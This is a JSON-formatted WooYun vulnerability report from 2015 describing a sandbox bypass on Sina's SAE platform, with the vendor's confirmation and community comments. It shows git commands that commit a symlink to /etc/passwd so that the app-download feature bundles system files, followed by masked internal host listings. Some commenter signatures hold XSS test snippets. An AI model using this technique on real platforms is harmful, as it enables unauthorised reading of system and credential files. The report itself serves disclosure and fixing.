{"id": 14100, "wybug_id": "wooyun-2015-0131911", "wybug_title": "绕过新浪SAE沙盒读取系统任意文件", "wybug_corp": "新浪", "wybug_author": "phith0n", "wybug_date": "2015-08-05 18:20", "wybug_open_date": "2015-09-20 11:44", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件遍历下载", "沙盒绕过"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-20：\t细节向公众公开  简要描述： 测试另一个洞，没注意被送了一个。。。定期打卡 详细说明：  类似这个洞，也是链接文件造成的沙盒绕过： WooYun: 绕过新浪SAE沙盒读取系统任意文件 sae在应用打包下载的时候，会将链接文件所指向文件一起打包起来，导致绕过沙盒读取任意文件。首先在git提交代码的时候，建立链接文件：\nln -s /etc/passwd passwdgit add .git commit -m \"123\"git push\n应用页面有一处下载：\n\n下载后解压缩，目标文件就躺在那里了：\n\n包括hosts文件，比较敏感我就打码了。只要有权限即可下载，沙盒什么的都无视掉：\n\nmask 区域\n*****.localdoma**********0.svndepl********************master.**********alert.sae**********image.sae**********igger.sae**********igger.sae**********orm.sae.s**********eploy.sae********** mail.sae**********queue.sae**********askqueue.sae********** rank.sae**********djob.sae.s********** stor.sae**********  log.sae**********pvuip.sae**********inter.sae**********   s3.sae**********otice.sae**********   ms.sae**********vcode.sae********** diag.sae**********  api.sae**********eploy.sae**********i.svn.sae**********t.sws.sae**********r.sws.sae**********ect.tools.**********annel.sae********************nitor.sae.********** admin.sae**********aemc.sae.s********************churl.sae**********gment.sae********** push.sae**********aepush.sae**********  fts.sae********************h.sws.sae**********h.sws.sae**********.sws.sae.s**********.sws.sae.s**********.sws.sae.s**********n.sws.sae.********************odefs.sae**********odefs.sae.********************  mcx.sae**********.mail.sae********************m3307.sae**********sql.sae.s**********pmysql.sae**********c.sae.sin**********query.sae.**********fetch.sae.**********se.sae.si**********oop.sae.s**********amcx.sae.********************ysql.sae.s**********mysql.sae.**********mysql.sae.**********6.sae.sin**********6.sae.sin**********i.sinacl**************************************************ger.sina**********ck.sae.s**********pi.sae.s******************************internal.sa*****\n\n   漏洞证明：  见上面。   修复方案：  禁止打包链接文件。   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-08-06 11:43 厂商回复： 感谢提醒，已经通知业务整改 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-05 18:21 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  机智！！    \n     2015-08-05 18:22 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  聪明！！    \n     2015-08-05 18:29 |    \t\t子墨 \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:22        | 天地不仁,以万物为刍狗;圣人不仁,以百姓为...)\t\t \n  大牛！膜拜~~~    \n     2015-08-05 18:31 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  猥琐！！    \n     2015-08-05 18:31 |    \t\tDloveJ \t\t\t( 普通白帽子  |\t\t\t        Rank:1107 漏洞数:200        | <a href=javascrip:alert('xss')>s</a> 点...)\t\t \n  机智！！！    \n     2015-08-05 18:48 |    \t\t土夫子 \t\t\t( 普通白帽子  |\t\t\t        Rank:173 漏洞数:41        | 逆流而上，顺势而为)\t\t \n  666666    \n     2015-08-05 19:02 |    \t\tMieless \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:1        | 我是来打酱油的。)\t\t \n  然而    \n     2015-08-05 20:12 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 每日必关注乌云)\t\t \n  基制    \n     2015-08-05 20:27 |    \t\tChinalover \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:4        | 你看得到我打在屏幕上的字，却看不到我落在...)\t\t \n  给P神跪了    \n     2015-08-05 20:40 |    \t\tsco4x0 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        | O_o)\t\t \n  ph师傅缺腿上的挂件吗？ 100多斤的那种    \n     2015-08-05 20:59 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  故事是这样的    \n     2015-08-05 21:23 |    \t\t卡卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:447 漏洞数:52        | <script>alert('安全团队长期招人')</scrip...)\t\t \n  事情是这样的    \n     2015-08-05 22:05 |    \t\t王松_Striker \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:5        | 热衷于XSS,但毛都不会。安全盒子（www.se...)\t\t \n  @sco4x0  4叔叔喜欢狗吗? 会敲代码的那种..    \n     2015-08-06 10:20 |    \t\tCode_Monkey \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:7        | Code Monkey think someday he have everyt...)\t\t \n  大牛缺猴子请来的逗比么？ 会打代码的那种。    \n     2015-08-07 09:37 |    \t\tComer \t\t\t( 普通白帽子  |\t\t\t        Rank:336 漏洞数:40        | 关注安全 | 关注智能漏洞挖掘)\t\t \n  看来不是link的事儿~ @phith0n    \n     2015-08-07 11:08 |    \t\t1c3z \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:29        | 我读书少，你可别骗我！！！)\t\t \n  zip？？？    \n     2015-09-20 11:46 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  这个思路吊炸天啊    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}